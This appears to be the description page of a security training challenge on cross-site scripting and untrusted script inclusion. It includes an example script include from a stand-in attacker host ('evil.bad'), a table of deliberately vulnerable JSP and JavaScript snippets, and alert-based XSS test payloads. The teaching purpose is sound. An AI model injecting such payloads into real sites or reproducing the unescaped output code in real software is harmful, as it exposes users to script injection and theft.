<p>
    The purpose of this challenge is to demonstrate the MITRE Top 25 programming flaw: 
    "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')".
<br><br>

  <blockquote>
         <i>The software does not neutralize or incorrectly neutralizes user-controllable input before
              it is placed in output that is used as a web page that is served to other users.</i>

  </blockquote>
  <p>Another Top 25 flaw that is related to XSS is "Inclusion of Functionality from Untrusted Control Sphere". 
      This particular weakness refers to including potentially malicious 3rd party widgets(which are script includes) into a web application.</p>
  <blockquote>
         <i>When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively 
             trust that functionality. Without sufficient protection mechanisms, the functionality
              could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). </i>

  <h4>A Bit About XSS</h4>
  <p>
    Web applications have become extremely widespread due to their portability and ease of use. 
    At the same time Cross-Site Scripting (XSS) has become one of the most common security bugs found in software.
  </p>
<p>
The main impact of XSS is that it allows attackers to alter the functionality of the web application. This is possible because attackers can inject JavaScript into the page. 
A common technique is to inject a JavaScript include to a site the attacker controls. Then they can write large scripts, even JavaScript keyloggers have been written.

Example malicious input:<code>&lt;script src="https://evil.bad/attack.js"&gt;&lt;/script&gt;</code>
The same concept applies to "Inclusion of Functionality from Untrusted Control Sphere".
</p>
<p>
XSS is relatively easy to find by novice testers while at the same time can be very hard to prevent. There are many areas in a page that need to be protected and many different type of payloads depending on each area.
</p>
<p>
    Here's just a few.
<table class="table table-sm">
    <thead>
        <tr>
            <th>Page context</th>
            <th>Vulnerable code</th>
            <th>Test payload for 'userName'</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Inside html tags</td>
            <td><pre>&lt;h1&gt;Welcome &lt;%=request.getParameter("userName");%&gt;!&lt;/h1&gt;</pre></td>
            <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
        </tr>
        <tr>
            <td>Inside html attributes</td>
            <td><pre>&lt;img src=&quot;/p/u/14/avtr.png&quot; title=&apos;Avatar for user &lt;%=request.getParameter(&quot;userName&quot;);%&gt;&apos;&gt;</pre></td>
            <td><code>' onload='alert(1)' x='</code></td>
        </tr>
        <tr>
            <td>Inside JavaScript code</td>
            <td><pre>document.cookie="username=&lt;%=request.getParameter(&apos;userName);%&gt;"</pre></td>
            <td><code>";alert(1);x="</code></td>
        </tr>
        <tr>
            <td>During dynamic DOM updates <small>- like in the case of an Ajax callback</small></td>
            <td><pre>message.innerHTML="Hello "+response.data.userName+"!"</pre></td>
            <td><code>&lt;img src=bla onerror=alert(1)&gt;</code></td>
        </tr>
    </tbody>

<h4>About the Challenge</h4> 
<p>The developers of the application implemented a social networking feature where users can see each others profiles. This is a nice looking Rich UI widget based on Bootstrap and JQuery.
    Users have the ability to preview how their profile looks to others.
</p>
<p>
    Obviously there's XSS in this newly introduced feature. You won't have to do anything nefarious, like stealing credentials, to pass the challenge. 
    <br>Simply produce a JavaScript alert that says 
    <code>FIRE!</code> <small>- including exclamation mark</small>. Every time a user sees your profile they should see the <code>FIRE!</code> message. 
    You can have fun with the page and pop-up all kind of messages if you'd like, but when you're ready, pop-up <code>FIRE!</code> and you can get your code.
</p>
<p>
Note: Due to complexities associated with executing JavaScript on the server side, the validation for the challenge is a regular expression so if you encounter any false positives/negatives, please excuse the organizers. 
</p>
<h5>Tips for completing the challenge</h5>
<p>
<ul>
    <li>It is not enough to insert HTML markup in the page. You need to see the actual javascript pop-up.</li>
    <li>Use view source to look at the javascript code in the page. See if you can spot an issue there.</li>
    <li>Leverage the payloads on this page. See if any of them pops.</li>
</ul>
</p>
